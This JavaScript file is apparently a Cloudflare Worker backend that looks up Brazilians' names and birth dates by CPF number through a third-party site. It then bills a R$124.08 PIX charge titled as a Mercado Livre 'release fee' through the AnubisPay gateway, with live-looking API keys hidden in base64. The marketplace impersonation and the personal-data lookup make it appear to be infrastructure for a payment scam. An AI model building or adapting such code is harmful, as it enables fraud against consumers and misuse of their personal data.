const ANUBIS_BASE = 'https://anubispay-e6cvb0febdfad9df.brazilsouth-01.azurewebsites.net';

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type'
};

function credentials(env) {
  const pub = (env && env.ANUBISPAY_PUBLIC_KEY) ||
    atob('YW51YmlzcGF5X2xpdmVfMUg0Q01GbUJ2a21vdUxIZWZuWmhKVGRFSGU3eDc5VTA=');
  const sec = (env && env.ANUBISPAY_SECRET_KEY) ||
    atob('c2tfbGl2ZV82d2tRdHRDdktndDdFTjB1cXc0WWozUDFESWtYNHB1Wg==');
  return { pub, sec };
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', ...CORS }
  });
}

async function readBody(request) {
  const ct = request.headers.get('content-type') || '';
  const text = await request.text();
  if (!text) return {};
  if (ct.includes('application/json')) {
    try { return JSON.parse(text); } catch { return {}; }
  }
  if (ct.includes('application/x-www-form-urlencoded')) {
    return Object.fromEntries(new URLSearchParams(text));
  }
  try { return JSON.parse(text); } catch { return {}; }
}

async function handleCpf(request) {
  const body = await readBody(request);
  const cpfLimpo = String(body.cpf || '').replace(/\D/g, '');
  if (cpfLimpo.length !== 11) {
    return json({ success: false, error: 'CPF inválido ou não fornecido' }, 400);
  }
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 9000);
    const resp = await fetch(`https://suapendencia.org/atencao1/api.php?cpf=${cpfLimpo}`, {
      headers: { Accept: 'application/json' },
      signal: controller.signal
    });
    clearTimeout(timer);
    if (!resp.ok) return json({ success: false, error: 'Erro ao consultar CPF' }, 502);
    const data = await resp.json();
    const dados = data.dados || data;
    const nome = dados.nome || '';
    if (!nome) return json({ success: false, error: 'CPF não encontrado.' }, 200);
    return json({
      success: true,
      nome,
      cpf: dados.cpf || cpfLimpo,
      data_nascimento: dados.data_nascimento || '',
      nascimento: dados.data_nascimento || ''
    });
  } catch (e) {
    return json({ success: false, error: 'Erro ao consultar CPF: ' + e.message }, 502);
  }
}

async function handlePagamento(request, env) {
  const body = await readBody(request);
  const cpfLimpo = String(body.cpf || '').replace(/\D/g, '');
  const nome = body.nome || 'Cliente';
  const email = body.email || `cpf${cpfLimpo}@temp.com`;
  const telefone = String(body.telefone || '').replace(/\D/g, '') || '11999999999';

  if (cpfLimpo.length !== 11) {
    return json({ success: false, error: 'CPF inválido ou não fornecido' }, 400);
  }

  const payload = {
    payment_method: 'pix',
    amount: 12408,
    customer: {
      name: nome,
      email,
      document: { type: 'cpf', number: cpfLimpo },
      phone: telefone
    },
    items: [{
      title: 'Taxa de Liberação - Mercado Livre',
      unit_price: 12408,
      quantity: 1,
      tangible: false,
      external_ref: `taxa_liberacao_${cpfLimpo}`
    }],
    pix: { expires_in_days: 1 },
    metadata: {
      provider_name: 'Mercado Livre - Taxa de Liberação',
      cpf: cpfLimpo,
      nome
    },
    ip: request.headers.get('cf-connecting-ip') || '127.0.0.1'
  };

  const { pub, sec } = credentials(env);
  const auth = btoa(`${pub}:${sec}`);

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 25000);
    const resp = await fetch(`${ANUBIS_BASE}/v1/payment-transaction/create`, {
      method: 'POST',
      headers: {
        Authorization: `Basic ${auth}`,
        'Content-Type': 'application/json',
        Accept: 'application/json'
      },
      body: JSON.stringify(payload),
      signal: controller.signal
    });
    clearTimeout(timer);

    const text = await resp.text();
    let data;
    try { data = JSON.parse(text); } catch { data = null; }

    if ((resp.status === 200 || resp.status === 201) && data && data.success && data.data) {
      const tx = data.data;
      const pix = tx.pix || {};
      return json({
        success: true,
        transaction_id: tx.id || '',
        qr_code: pix.qr_code || '',
        expiration_date: pix.expiration_date || '',
        status: tx.status || 'PENDING',
        amount: typeof tx.amount === 'number' ? tx.amount / 100 : 124.08,
        source: 'anubispay'
      });
    }

    const errors = (data && data.error_messages) || [];
    const msg = Array.isArray(errors)
      ? errors.map(e => (e && e.message) || e).join('; ')
      : String(errors);
    return json({ success: false, error: msg || `Falha AnubisPay (HTTP ${resp.status})` }, 502);
  } catch (e) {
    return json({ success: false, error: 'Erro ao conectar na AnubisPay: ' + e.message }, 502);
  }
}

async function handleVerificar(request, env, url) {
  const body = await readBody(request);
  const transactionId = body.transaction_id || url.searchParams.get('transaction_id');
  if (!transactionId) return json({ success: false, error: 'transaction_id não fornecido' }, 400);

  const { pub, sec } = credentials(env);
  const auth = btoa(`${pub}:${sec}`);

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 15000);
    const resp = await fetch(`${ANUBIS_BASE}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
      headers: { Authorization: `Basic ${auth}`, Accept: 'application/json' },
      signal: controller.signal
    });
    clearTimeout(timer);
    if (resp.status === 429) {
      return json({ success: true, transaction_id: transactionId, status: 'PENDING', paid: false });
    }
    const text = await resp.text();
    let data;
    try { data = JSON.parse(text); } catch { data = null; }
    if (data && data.success && data.data) {
      const status = data.data.status || 'PENDING';
      return json({ success: true, transaction_id: transactionId, status, paid: status === 'PAID' });
    }
    return json({ success: true, transaction_id: transactionId, status: 'PENDING', paid: false });
  } catch (e) {
    return json({ success: true, transaction_id: transactionId, status: 'PENDING', paid: false });
  }
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    if (request.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: CORS });
    }

    if (path === '/processar_cpf.php' || path === '/api/processar_cpf') {
      if (request.method !== 'POST') return json({ success: false, error: 'Method not allowed' }, 405);
      return handleCpf(request);
    }
    if (path === '/processar_pagamento.php' || path === '/api/processar_pagamento') {
      if (request.method !== 'POST') return json({ success: false, error: 'Method not allowed' }, 405);
      return handlePagamento(request, env);
    }
    if (path === '/verificar_pagamento.php' || path === '/api/verificar_pagamento') {
      return handleVerificar(request, env, url);
    }
    if (path === '/webhook.php' || path === '/api/webhook') {
      return json({ received: true, message: 'Webhook recebido com sucesso' });
    }

    const rewrites = {
      '/confirmar.php': '/confirmar.html',
      '/resumo_pagamento.php': '/resumo_pagamento.html',
      '/pagamento_sucesso.php': '/pagamento_sucesso.html'
    };
    if (rewrites[path]) {
      const newUrl = new URL(request.url);
      newUrl.pathname = rewrites[path];
      return env.ASSETS.fetch(new Request(newUrl.toString(), request));
    }

    return env.ASSETS.fetch(request);
  }
};
